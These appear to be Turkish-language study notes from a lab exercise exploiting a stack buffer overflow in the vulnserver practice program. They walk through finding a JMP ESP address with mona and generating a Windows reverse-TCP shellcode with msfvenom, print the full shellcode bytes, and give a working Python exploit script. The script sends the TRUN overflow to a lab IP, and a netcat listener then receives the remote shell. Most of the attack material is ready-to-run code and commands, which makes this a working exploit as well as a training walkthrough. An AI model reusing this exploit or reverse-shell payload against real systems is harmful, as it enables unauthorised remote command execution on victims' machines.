Bad characterimizi biliyoruz. Bu örnekte sadece x00.

Şimdi sıra "B" * 4 yerine yani EIP içerisine ne yazacağımızı bulmakta ve badChars yerine kendi shellcode'umuzu yollamakta.

Bizim "B" * 4 yerine oluşturacağımız shellcode'a yönlendirecek bir şey yazmamız lazım. Bunu assembly'de yazacağız.
Shellcode : Kali'ye geri bağlantı açacak kod.

Shellcode ile beraber karşı tarafta istediğimiz kodu çalıştırabileceğiz.

Assembly'de yazdığımız yeri çalıştıracak bir program, method bir şey bulmamız gerekiyor.
Jump to shellcode yani enjekte etmek istediğin koda nasıl gidilir, EIP'ye oraya nasıl yönlendiririz bulmamız gerek.


**************************** https://www.abatchy.com/2017/05/jumping-to-shellcode.html **************************** 


Bu siteye bakacak olursak en çok kullanılan şey JMP (jump = zıpla) ve bununla birlikte gelen kodlar.
Genelde JMP ESP kullanılır ama tek yol yani tek assembly kodu bu değildir. Sitede farklı kodları da görürsün.
Biz kendi kodumuzu nasıl yapacağız onu bulacağız. JMP ESP deneyeceğiz. Olmazsa başka şeyler de denenebilir.

/usr/share/metasploit-framework/tools/exploit/  klasöründe nasm_shell.rb ile birlikte assembly kodlarını hex coduna dönüştürebiliriz. 

./nasm_shell.rb   komutuyla bu programı çalıştırırız.
Program açıldıktan sonra "nasm >" yerine istediğimiz kodu yazabiliriz. O kod da bize karşılığında hex kodunu verecektir.

JMP ESP yazıyoruz. Bu kod bizi alacak ve oluşturacağımız zararlı koda geri gönderecek.
Enter'a basarsak bize FFE4 verir.
exit komutuyla nasm'dan çıkarız.


Immunity debugger içerisinde python kodları çalıştırabiliyoruz.
Windows'a gidiyoruz ve mona isimli python aracını internetten indiriyoruz.
github.com/corelan/mona  adresinden download zip diyip indirebiliriz.
İndirdiğimiz klasörden mona.py'yi almamız yeterli.

Immunity debugger klasöründeki PyCommands klasörüne gidiyoruz. Bu klasörde immunity debugger içerisinde çalıştırabileceğin python kodlarını görürsün.
mona.py'yi bu klasöre koyuyoruz.

vulnserver ve immunity debugger'ı çalıştırıyoruz.
immunity debugger'ın altında beyaz komut satırı vardır. Oraya:

!mona modules    yazıyoruz.

Burada vulnserver ile birlikte windows'ta çalışan diğer bütün servislerin burada bir görüntüsünü görürüz.
Eğer false görüyorsan o false gördüğün modüllerde memory koruması yok demektir.
False olduğunu gördüğün ve vulnserver ile çalışan yerler bizim kullanımımız için ideal dosyalardır.
Çünkü memory koruması yok ve hacklemek istediğimiz şeyle birebir aynı yani o serviste çalışıyor.
Burada bir JMP ESP kodu bulabilirsek ve o kodu kullanarak bir işlem yapabilirsek o zaman istediğimiz sonuca varırız.
Bunun için:

!mona find -s "\xff\xe4" -m essfunc.dll  ---> FFE4'ü arıyoruz.
                                         ---> essfunc.dll : false olan modül

Çalıştırıyoruz.
Aradığımız şey burada bize döndürülen sonuçlar.
Buradaki sonuçlar hem essfunc.dll'in içerisinde herhangi bir memory koruması yok, hem de oradaki adreslerde JMP ESP işlemi çalıştırılıyor. Ben bunu kullanarak EIP'ye bir yazılım yapabilirsem o zaman gösterdiğimiz shellcode'a yönlendirme yapabiliriz.
Çıkan sonuçları tek tek denememiz gerekiyor. Hangi satırda, hangi yerinde çalışacağını bilemeyebiliriz.
Biliyoruz ki buralarda JMP ESP çalıştırılacak ve bu adresleri kullanarak istediğimiz sonucu elde edebiliriz.


Msfvenom aracı : Metasploit gibi bacckdoor oluşturmamıza, trojen gibi bize geri bağlantı açacak zararlı bir kod oluşturmamıza olanak tanıyan bir araç. Assembly koduyla bize geri dönüş yapmasını sağlayabiliriz.

Terminale gidip:

msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.10 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"

p : payload
reverse : bize geri bağlanması
bind : bizim hedefe bağlanmamız
LHOST : bağlantının nereye geleceği
LPORT : fark etmez
EXITFUNC : thread ya da process olur. proccess ---> metasploitin kendi modülü olan multi handler ile yapmak istersen           kullanırsın, diğer türlü thread'i kullanırsın.
f : format, c dilinde olacak. shellcode istediğimiz için c string gibi assembly dilinde geri dönüş verecek.
a : architecture, x86. 32 bit ile çalışıyoruz.
b : bad characters. shellcodumuzda istemediğimiz tek karakter \x00.

BUNU ÇALIŞTIRIRSAK BİZİM İÇİN İÇERİSİNDE \x00'ı KULLANMADAN BİR SHELLCODE OLUŞTURACAK:

"\xbe\xcb\x97\xd1\xbc\xd9\xc9\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x31\x70\x12\x03\x70\x12\x83\x0b\x93\x33\x49\x77\x74\x31"
"\xb2\x87\x85\x56\x3a\x62\xb4\x56\x58\xe7\xe7\x66\x2a\xa5\x0b"
"\x0c\x7e\x5d\x9f\x60\x57\x52\x28\xce\x81\x5d\xa9\x63\xf1\xfc"
"\x29\x7e\x26\xde\x10\xb1\x3b\x1f\x54\xac\xb6\x4d\x0d\xba\x65"
"\x61\x3a\xf6\xb5\x0a\x70\x16\xbe\xef\xc1\x19\xef\xbe\x5a\x40"
"\x2f\x41\x8e\xf8\x66\x59\xd3\xc5\x31\xd2\x27\xb1\xc3\x32\x76"
"\x3a\x6f\x7b\xb6\xc9\x71\xbc\x71\x32\x04\xb4\x81\xcf\x1f\x03"
"\xfb\x0b\x95\x97\x5b\xdf\x0d\x73\x5d\x0c\xcb\xf0\x51\xf9\x9f"
"\x5e\x76\xfc\x4c\xd5\x82\x75\x73\x39\x03\xcd\x50\x9d\x4f\x95"
"\xf9\x84\x35\x78\x05\xd6\x95\x25\xa3\x9d\x38\x31\xde\xfc\x54"
"\xf6\xd3\xfe\xa4\x90\x64\x8d\x96\x3f\xdf\x19\x9b\xc8\xf9\xde"
"\xdc\xe2\xbe\x70\x23\x0d\xbf\x59\xe0\x59\xef\xf1\xc1\xe1\x64"
"\x01\xed\x37\x2a\x51\x41\xe8\x8b\x01\x21\x58\x64\x4b\xae\x87"
"\x94\x74\x64\xa0\x3f\x8f\xef\xc5\xbf\x8d\xe5\xb1\xbd\x91\xe8"
"\x1d\x4b\x77\x60\x8e\x1d\x20\x1d\x37\x04\xba\xbc\xb8\x92\xc7"
"\xff\x33\x11\x38\xb1\xb3\x5c\x2a\x26\x34\x2b\x10\xe1\x4b\x81"
"\x3c\x6d\xd9\x4e\xbc\xf8\xc2\xd8\xeb\xad\x35\x11\x79\x40\x6f"
"\x8b\x9f\x99\xe9\xf4\x1b\x46\xca\xfb\xa2\x0b\x76\xd8\xb4\xd5"
"\x77\x64\xe0\x89\x21\x32\x5e\x6c\x98\xf4\x08\x26\x77\x5f\xdc"
"\xbf\xbb\x60\x9a\xbf\x91\x16\x42\x71\x4c\x6f\x7d\xbe\x18\x67"
"\x06\xa2\xb8\x88\xdd\x66\xd8\x6a\xf7\x92\x71\x33\x92\x1e\x1c"
"\xc4\x49\x5c\x19\x47\x7b\x1d\xde\x57\x0e\x18\x9a\xdf\xe3\x50"
"\xb3\xb5\x03\xc6\xb4\x9f"

BU BİZİM İÇİN OLUŞTURULMUŞ BİR BACKDOOR, BİR ZARARLI YAZILIM. 
HEX HALİNDE GELİYOR. ASSEMBLY INSTRUCTIONLARINA DÖNDÜRÜLEREK ÇALIŞTIRILACAK.

Payload size da verilir: 351 bytes
Yani karakterleri sayarsan 351 olduğunu görürsün.
Bazı zamanlarda karşı tarafa yapacağın saldırının boyutu önemli olabiliyor. Zorluk çıkartabilir.





SHELLCODE
---------
import socket
import sys

#625011af   ---> Immunity debugger sonuçlarından biri. Sonuçlar denenerek uygun olan bulunur.

overflowPayload = ("\xbe\xcb\x97\xd1\xbc\xd9\xc9\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x31\x70\x12\x03\x70\x12\x83\x0b\x93\x33\x49\x77\x74\x31"
"\xb2\x87\x85\x56\x3a\x62\xb4\x56\x58\xe7\xe7\x66\x2a\xa5\x0b"
"\x0c\x7e\x5d\x9f\x60\x57\x52\x28\xce\x81\x5d\xa9\x63\xf1\xfc"
"\x29\x7e\x26\xde\x10\xb1\x3b\x1f\x54\xac\xb6\x4d\x0d\xba\x65"
"\x61\x3a\xf6\xb5\x0a\x70\x16\xbe\xef\xc1\x19\xef\xbe\x5a\x40"
"\x2f\x41\x8e\xf8\x66\x59\xd3\xc5\x31\xd2\x27\xb1\xc3\x32\x76"
"\x3a\x6f\x7b\xb6\xc9\x71\xbc\x71\x32\x04\xb4\x81\xcf\x1f\x03"
"\xfb\x0b\x95\x97\x5b\xdf\x0d\x73\x5d\x0c\xcb\xf0\x51\xf9\x9f"
"\x5e\x76\xfc\x4c\xd5\x82\x75\x73\x39\x03\xcd\x50\x9d\x4f\x95"
"\xf9\x84\x35\x78\x05\xd6\x95\x25\xa3\x9d\x38\x31\xde\xfc\x54"
"\xf6\xd3\xfe\xa4\x90\x64\x8d\x96\x3f\xdf\x19\x9b\xc8\xf9\xde"
"\xdc\xe2\xbe\x70\x23\x0d\xbf\x59\xe0\x59\xef\xf1\xc1\xe1\x64"
"\x01\xed\x37\x2a\x51\x41\xe8\x8b\x01\x21\x58\x64\x4b\xae\x87"
"\x94\x74\x64\xa0\x3f\x8f\xef\xc5\xbf\x8d\xe5\xb1\xbd\x91\xe8"
"\x1d\x4b\x77\x60\x8e\x1d\x20\x1d\x37\x04\xba\xbc\xb8\x92\xc7"
"\xff\x33\x11\x38\xb1\xb3\x5c\x2a\x26\x34\x2b\x10\xe1\x4b\x81"
"\x3c\x6d\xd9\x4e\xbc\xf8\xc2\xd8\xeb\xad\x35\x11\x79\x40\x6f"
"\x8b\x9f\x99\xe9\xf4\x1b\x46\xca\xfb\xa2\x0b\x76\xd8\xb4\xd5"
"\x77\x64\xe0\x89\x21\x32\x5e\x6c\x98\xf4\x08\x26\x77\x5f\xdc"
"\xbf\xbb\x60\x9a\xbf\x91\x16\x42\x71\x4c\x6f\x7d\xbe\x18\x67"
"\x06\xa2\xb8\x88\xdd\x66\xd8\x6a\xf7\x92\x71\x33\x92\x1e\x1c"
"\xc4\x49\x5c\x19\x47\x7b\x1d\xde\x57\x0e\x18\x9a\xdf\xe3\x50"
"\xb3\xb5\x03\xc6\xb4\x9f")

                              EIP'YE JUMP YAPAN ESP KODU.
                              SHELLCODE'A YÖNLENDİRME YAPAR.
                              RAM TERS OKUR. DÜZ YAZARAK DA DENEYEBİLİRSİN.
                              x86 YAPISINDA OLDUĞUMUZDAN TERS.
                                                   |
stringToSend = "TRUN /.:/" + "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflowPayload
                                                                  |                 |
                                                                  |            KALI'YE BAĞLANTI AÇACAK KOD
                                                      PAYLOAD SIZE İLE İLGİLİ
                    no opt dediğimiz, hiçbir işlem yapılmayan assembly kodlarını buraya yazarız.
                    bir işlem yapmaz ama arada es vermek sistem için daha mantıklıdır
                    bunu yapmazsan çalışmayabilir.
                    karşı tarafa yollayacağın şey 400 bytes'ı vs. geçemeyecek gibiyse bunu yapmadan da deneyebilirsin.
                    şu an böyle bir derdimiz yok. o yüzden 32 bytes'lik bir no opt yollayacağız.
                    32 deneyebilirsin, 6 deneyebilirsin, 2 deneyebilirsin, 1 deneyebilirsin, çalışana kadar denersin.
                                                        

try:
   mySocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   mySocket.connect(("10.0.2.15", 9999))
   bytes = stringToSend.encode(encoding="latin1")
   mySocket.send(bytes)
   mySocket.close()

except Exception as e:
   print(e)
   sys.exit()



KEYBOARD INTERRUPT'I ÇIKARDIK ÇÜNKÜ WHILE LOOP VS. YOK, TEK SEFERLİK BİR ŞEY YOLLAYACAĞIZ.
ÖNCE VULNSERVER'I AÇARSIN. ARTIK IMMUNITY DEBUGGER'A GEREK YOK.
SONRA NETCAT'I ÇALIŞTIRIRSIN. DİNLEME YAPMAMIZ LAZIM ÇÜNKÜ BİZE GERİ BAĞLANTI GELECEK. BACKDOOR'DAKİ DİNLEME GİBİ.
BAĞLANTI GELECEK, DİNLEMEZSEN ALAMAZSIN.

nc -nvlp 4444

KOMUTUYLA DİNLEMEYE BAŞLARSIN.
ŞİMDİ KODUNU ÇALIŞTIRABİLİRSİN.
KODUN ÇALIŞIP KAPANIR.
NC'E BAKARSAN WINDOWS BAĞLANTISINI GÖRÜRSÜN.
WINDOWS'A BAKARSAN SERVER'IN ÇALIŞTIĞINI GÖRÜRSÜN, ÇÖKMEZ. NC'DEKİ BAĞLANTININ CANLI OLMASINI O SAĞLAR.

TERMİNALDEKİ NC EKRANINDA:
whoami 
ÇALIŞTIRIRSAN KULLANICIYI SÖYLER.

İSTEDİĞİN KOMUTLARI YAZABİLİRSİN.

WINDOWS'U HACKLEMEYİ BAŞARDIK.













